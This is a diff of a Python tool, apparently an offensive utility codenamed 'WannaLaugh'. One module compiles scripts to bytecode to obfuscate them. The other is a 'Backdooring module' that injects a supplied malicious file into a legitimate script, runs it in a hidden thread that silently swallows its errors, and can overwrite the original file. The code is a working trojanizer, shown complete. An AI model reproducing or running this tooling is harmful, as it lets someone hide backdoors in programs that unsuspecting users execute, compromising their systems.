@@ -30,6 +30,11 @@ import commands
 import time
 import random
 
+error = '\033[37;41m'
+error1 = '\033[1;m'
+
+sucess = '\033[32m'
+sucess1 = '\033[37m'
 
 
 text = """
@@ -293,7 +298,6 @@ VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
                                         Version 3.0
                                         Codename 'WannaLaugh'
 
-
        """
 menu_linux = "\033[32m" + (menu) + "\033[37m"
 
@@ -313,7 +317,7 @@ name = """
 ------------------------------------------------
 	   """
 
-name_linux = "\033[31m" +  (name) + "\033[37m"
+name_linux = "\033[32m" +  (name) + "\033[37m"
 
 #options
 
@@ -329,13 +333,21 @@ if not option.file :
 	sys.exit()
 
 
+# Encryption module
+
 elif  option.file and not option.backdoor :
 
-	payload = (option.file)
+	print (menu_linux)
+	print (name_linux)
 
-	didi = open(payload,'r')
-	hades = didi.read()
-	didi.close()
+	payload = (option.file)
+	try:
+
+		didi = open(payload,'r')
+		hades = didi.read()
+		didi.close()
+	except:
+		sys.exit(error+"[-] cannot read file '{}'".format(payload)+error1)
 
 
 	hd = open(payload,'w')
@@ -360,22 +372,13 @@ elif  option.file and not option.backdoor :
 	india.close()
 
 
-	if (sys.platform.startswith("linux")) :
-		print (menu_linux)
-		print ("")
-		print (name_linux)
-	else:
-		print (menu)
-		print ("")
-		print (name)
-
 	if not option.out :
 		try:
 			py_compile.compile(payload, cfile=_byte_, dfile=None, doraise=False, ) #compilation
 		except (py_compile.PyCompileError,IOError,TypeError) :
 			sys.exit("encryption error :  file  {} don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/listener.py".format(option.file)) #error
-		print ("[*] file : {}".format(option.file))
-		print ("[*] default output : {}".format(_output_))
+		print (sucess+"[*] file : {}".format(option.file)+sucess1)
+		print (sucess+"[*] default output : {}".format(_output_)+sucess1)
 		if (sys.platform.startswith("linux"))  :
 			os.system(" mv  {} {} ".format(_byte_,_output_))
 
@@ -385,13 +388,13 @@ elif  option.file and not option.backdoor :
 		elif (sys.platform.startswith("darwin")):
 			os.system(" mv {}  {} ".format(_byte_,_output_))
 
-		print ("[+] encryption finished")
-		print ("[+] file : {} ".format(_output_))
+		print (sucess+"[+] encryption finished"+sucess1)
+		print (sucess+"[+] file : {} ".format(_output_)+sucess1)
 	elif option.out  :
 		output = option.out
 		bytecode = (option.out) + "c"
-		print ("[*] file : {}".format(option.file))
-		print ("[*] output : {}".format(output))
+		print (sucess+"[*] file : {}".format(option.file)+sucess1)
+		print (sucess+"[*] output : {}".format(output)+sucess1)
 		try :
 			py_compile.compile(payload, cfile=bytecode, dfile=None, doraise=False, ) #compilation
 		except (py_compile.PyCompileError,IOError,TypeError) :
@@ -403,71 +406,122 @@ elif  option.file and not option.backdoor :
 		elif (sys.platform.startswith("darwin")):
 			os.system("mv {}  {} ".format(bytecode,output))
 
-		print ("[+] encryption finished  ")
-		print ("[*] file : {} ".format(output))
+		print (sucess+"[+] encryption finished  "+sucess1)
+		print (sucess+"[*] file : {} ".format(output)+sucess1)
+
+
+
+
+# Backdooring module
 
 elif (option.backdoor) :
-	if (sys.platform.startswith("linux")) :
-		print (menu_linux)
-		print ("")
-		print (name_linux)
-	else:
-		print (menu)
-		print ("")
-		print (name)
+
+	print (menu_linux)
+	print (name_linux)
+
 
 	if (option.out) :
 		_output_ = (option.out)
+		time.sleep(2)
+		try:
+			file_to_write = open(option.file,'r').read()
+		except :
+			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
+		try:
+			backdoor_to_write = open(option.backdoor,'r').read()
+		except :
+			sys.exit(error+"[-]) cannot read file {}".format(option.backdoor)+error1)
 
-	else:
-		pass
-	print ("[*] Injecting malicious file '{}' into '{}' and output will be '{}' ...".format(option.backdoor,option.file,_output_))
-	time.sleep(2)
-	try:
-		file_to_write = open(option.file,'r').read()
-	except :
-		sys.exit("[-] cannot read file {}".format(option.file))
-	try:
-		backdoor_to_write = open(option.backdoor,'r').read()
-	except :
-		sys.exit("[-]) cannot read file {}".format(option.backdoor))
+		hm = open(_output_,'w')
+		hm.write("#!/usr/bin/python3\nimport threading\n")
+		hm.write("def fcb():\n")
+		for lines in (file_to_write.split("\n")) :
+			hm.write("\t"+(lines)+"\n")
+		hm.write("def rma():\n")
+		hm.write("\t"+"try:")
+		for haha in (backdoor_to_write.split("\n")):
+			hm.write("\t"+"\t"+(haha)+"\n")
+		hm.write("\texcept:\n")
+		hm.write("\t\tpass\n")
+		hm.write("thread_1 = threading.Thread(target=fcb)\n")
+		hm.write("thread_2 = threading.Thread(target=rma)\n")
+		hm.write("thread_1.start()\n")
+		hm.write("thread_2.start()\n")
+		hm.close()
+		print(sucess+"[+] Injection finished "+sucess1)
+		print(sucess+"[*] Output : {} ".format(_output_)+sucess1)
 
-	hm = open(_output_,'w')
-	hm.write("#!/usr/bin/python3\nimport threading\n")
-	hm.write("def fcb():\n")
-	for lines in (file_to_write.split("\n")) :
-		hm.write("\t"+(lines)+"\n")
-	hm.write("def rma():\n")
-	hm.write("\t"+"try:")
-	for haha in (backdoor_to_write.split("\n")):
-		hm.write("\t"+"\t"+(haha)+"\n")
-	hm.write("\texcept:\n")
-	hm.write("\t\tpass\n")
-	hm.write("thread_1 = threading.Thread(target=fcb)\n")
-	hm.write("thread_2 = threading.Thread(target=rma)\n")
-	hm.write("thread_1.start()\n")
-	hm.write("thread_2.start()\n")
-	hm.close()
-	print("[+] Injection finished ")
-	print("[*] Output : {} ".format(_output_))
-
-	question = raw_input("Do you want  encrypt (obfuscate) the output [y/n] ? ")
-	if (question.lower()) == "y" :
-		py_compile.compile(_output_, cfile=(_output_)+"c", dfile=None, doraise=False, )
-		if (sys.platform.startswith("linux")):
-			os.system("mv {}  {} ".format(_output_+"c",_output_))
-		elif (sys.platform.startswith("windows")):
-			os.system("rename {}  {} ".format(_output_+"c",_output_))
-		elif (sys.platform.startswith("darwin")):
-			os.system("mv {}  {} ".format(_output_+"c",_output_))
+		question = raw_input(sucess+"[*] Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
+		if (question.lower()) == "y" :
+			py_compile.compile(_output_, cfile=(_output_)+"c", dfile=None, doraise=False, )
+			if (sys.platform.startswith("linux")):
+				os.system("mv {}  {} ".format(_output_+"c",_output_))
+			elif (sys.platform.startswith("windows")):
+				os.system("rename {}  {} ".format(_output_+"c",_output_))
+			elif (sys.platform.startswith("darwin")):
+				os.system("mv {}  {} ".format(_output_+"c",_output_))
 		else:
 			pass
+
 		if (sys.platform.startswith("linux")):
 			os.system("chmod +x {}".format(_output_))
 		else:
 			pass
 
-		print("[+] encryption finished ")
+		print(sucess+"[+] Encryption finished "+sucess1)
 
-	else:
-		sys.exit()
+
+
+	elif not (option.out) :
+		try:
+			file_to_write = open(option.file,'r').read()
+		except :
+			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
+		try:
+			backdoor_to_write = open(option.backdoor,'r').read()
+		except :
+			sys.exit(error+"[-] cannot read file {}".format(option.backdoor)+error1)
+
+		test = open(option.file,'r').read()
+
+
+		if "thread_1.start()" in (test):
+			sys.exit(error+"[-] File '{}' is already backdoored ".format(option.file)+error1)
+
+		hm = open(option.file,'w')
+		hm.write("#!/usr/bin/python3\nimport threading\n")
+		hm.write("def fcb():\n")
+		for lines in (file_to_write.split("\n")) :
+			hm.write("\t"+(lines)+"\n")
+		hm.write("def rma():\n")
+		hm.write("\t"+"try:\n")
+		for haha in (backdoor_to_write.split("\n")):
+			hm.write("\t"+"\t"+(haha)+"\n")
+		hm.write("\texcept:\n")
+		hm.write("\t\tpass\n")
+		hm.write("thread_1 = threading.Thread(target=fcb)\n")
+		hm.write("thread_2 = threading.Thread(target=rma)\n")
+		hm.write("thread_1.start()\n")
+		hm.write("thread_2.start()\n")
+		hm.close()
+		print(sucess+"[+] Injection finished  "+sucess1)
+		question = raw_input(sucess+"Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
+		if (question.lower()) == "y" :
+			py_compile.compile(option.file, cfile=(option.file)+"c", dfile=None, doraise=False, )
+			_output_ = option.file
+			if (sys.platform.startswith("linux")):
+				os.system("mv {}  {} ".format(_output_+"c",_output_))
+			elif (sys.platform.startswith("windows")):
+				os.system("rename {}  {} ".format(_output_+"c",_output_))
+			elif (sys.platform.startswith("darwin")):
+				os.system("mv {}  {} ".format(_output_+"c",_output_))
+			else:
+				pass
+			if (sys.platform.startswith("linux")):
+				os.system("chmod +x {}".format(_output_))
+
+			print("[+] Encryption finished ")	
+		else:
+			pass
+else:
+	sys.exit()
